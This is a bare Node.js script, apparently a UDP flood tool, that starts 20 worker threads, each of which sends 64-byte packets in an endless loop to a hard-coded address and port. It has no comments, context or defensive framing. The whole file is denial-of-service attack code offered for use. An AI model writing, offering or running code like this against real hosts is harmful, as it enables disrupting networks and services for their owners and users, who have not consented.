const { Worker, isMainThread, workerData } = require('worker_threads');
const dgram = require('dgram');

const TARGET = '192.168.1.100';
const PORT = 1234;
const SIZE = 64;
const THREADS = 20;

if (isMainThread) {
    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, {
            workerData: { target: TARGET, port: PORT, size: SIZE }
        });
    }
} else {
    const { target, port, size } = workerData;
    const socket = dgram.createSocket('udp4');
    const message = Buffer.alloc(size, 'A');

    function blast() {
        while (true) {
            socket.send(message, port, target);
        }
    }

    blast();
}
